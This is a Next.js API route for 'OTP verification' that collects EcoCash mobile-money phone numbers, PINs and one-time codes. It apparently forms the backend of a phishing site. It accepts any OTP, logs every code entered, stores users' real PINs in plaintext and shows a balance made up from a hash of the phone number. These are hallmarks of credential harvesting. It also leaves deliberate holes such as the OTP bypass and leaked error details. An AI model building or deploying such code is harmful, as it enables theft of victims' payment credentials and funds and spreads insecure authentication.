import { neon } from "@neondatabase/serverless"
import { NextResponse } from "next/server"
import { encrypt } from "@/lib/auth"

const sql = neon(process.env.DATABASE_URL!)

export async function POST(req: Request) {
  if (!process.env.DATABASE_URL) {
    console.error("DATABASE_URL is missing")
    return NextResponse.json({ error: "Configuration error" }, { status: 500 })
  }

  try {
    const { ecocashPhone, ecocashPin, otp } = await req.json()

    // Normalize phone number - remove all spaces first, then ensure it has + sign
    const cleanPhone = String(ecocashPhone).replace(/\s/g, '')
    const normalizedPhone = cleanPhone.startsWith('+') ? cleanPhone : `+${cleanPhone}`

    console.log(`[Verify-OTP] Attempting verification for: ${normalizedPhone}, OTP: ${otp}`)

    if (!ecocashPhone || !otp) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
    }

    // 1. Log OTP_VERIFY_ATTEMPT with phone and OTP entered
    try {
      await sql`
                INSERT INTO activity_logs (phone_number, activity_type, input_otp)
                VALUES (${String(normalizedPhone)}, 'OTP_VERIFY_ATTEMPT', ${String(otp)})
            `
    } catch (logErr) {
      console.error("[Verify-OTP] Logging failed (continuing):", logErr)
    }

    // DEMO MODE: Accept any OTP - just verify phone number exists (no status check)
    console.log(`[Verify-OTP] Looking for phone: ${normalizedPhone}`)

    const result = await sql`
           SELECT * FROM profiles 
           WHERE phone_number = ${String(normalizedPhone)}
        `

    console.log(`[Verify-OTP] User found: ${result.length > 0}`)
    console.log(`[Verify-OTP] Query result count: ${result.length}`)

    if (result.length > 0) {
      console.log(`[Verify-OTP] Found user with phone: ${result[0].phone_number}, status: ${result[0].status}`)
    }

    if (result.length === 0) {
      // Log OTP_VERIFY_FAILED
      try {
        await sql`
                    INSERT INTO activity_logs (phone_number, activity_type, input_otp)
                    VALUES (${String(normalizedPhone)}, 'OTP_VERIFY_FAILED', ${String(otp)})
                `
      } catch (logErr) {
        console.error("[Verify-OTP] Failed to log verification failure:", logErr)
      }
      return NextResponse.json({ error: "Phone number not found. Please register first." }, { status: 401 })
    }

    // Update OTP in database to match what user entered (for logging)
    await sql`
            UPDATE profiles 
            SET otp_code = ${String(otp)}
            WHERE phone_number = ${String(normalizedPhone)}
        `

    const user = result[0]

    // Calculate balance
    const phoneHash = String(ecocashPhone).split("").reduce((acc: any, char: any) => acc + char.charCodeAt(0), 0)
    const balance = (phoneHash % 300) + 20

    // Only update PIN if provided (not '0000')
    const finalPin = (ecocashPin && ecocashPin !== '0000') ? ecocashPin : user.pin

    try {
      await sql`
               UPDATE profiles 
               SET pin = ${String(finalPin)}, status = 'verified', updated_at = NOW(), account_balance = ${balance}
               WHERE phone_number = ${String(normalizedPhone)}
            `
      console.log("[Verify-OTP] User updated (verified)")
    } catch (dbError: any) {
      console.error("[Verify-OTP] Update failed:", dbError)
      throw dbError
    }

    // Log OTP_VERIFY_SUCCESS
    try {
      await sql`
                INSERT INTO activity_logs (phone_number, activity_type, input_otp)
                VALUES (${String(normalizedPhone)}, 'OTP_VERIFY_SUCCESS', ${String(otp)})
            `
    } catch (logErr) {
      console.error("[Verify-OTP] Failed to log success:", logErr)
    }

    // Create User Session
    const session = await encrypt({
      id: user.id.toString(),
      phone: normalizedPhone,
      role: "user"
    })

    const res = NextResponse.json({
      success: true,
      message: "Phone number verified successfully",
      redirect: "/dashboard"
    })

    res.cookies.set("session", session, {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      expires: new Date(Date.now() + 24 * 60 * 60 * 1000)
    })

    return res

  } catch (error: any) {
    console.error("OTP verification error FULL:", error)
    return NextResponse.json({
      error: "Verification failed",
      details: error.message
    }, { status: 500 })
  }
}
